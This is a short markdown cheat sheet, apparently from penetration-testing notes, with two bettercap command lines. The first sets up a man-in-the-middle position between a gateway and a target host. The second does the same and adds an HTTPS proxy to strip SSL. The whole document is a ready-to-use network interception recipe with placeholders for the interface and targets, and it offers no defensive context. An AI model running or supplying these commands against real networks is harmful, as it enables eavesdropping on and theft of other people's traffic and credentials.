# Establish MitM
```bash
# Bettercap can automatically detect the gateway.
# If not targeting the gateway, specify the desired target.
# Ensure IP Forwarding is enabled
sudo bettercap -I <Interface Name> -X -G <First Target> -T <Second Target>
```

# Establish MitM and Strip SSL
```bash
# Ensure IP Forwarding is enabled
sudo bettercap -I <Interface Name> -X -G <First Target> -T <Second Target> --proxy-https
```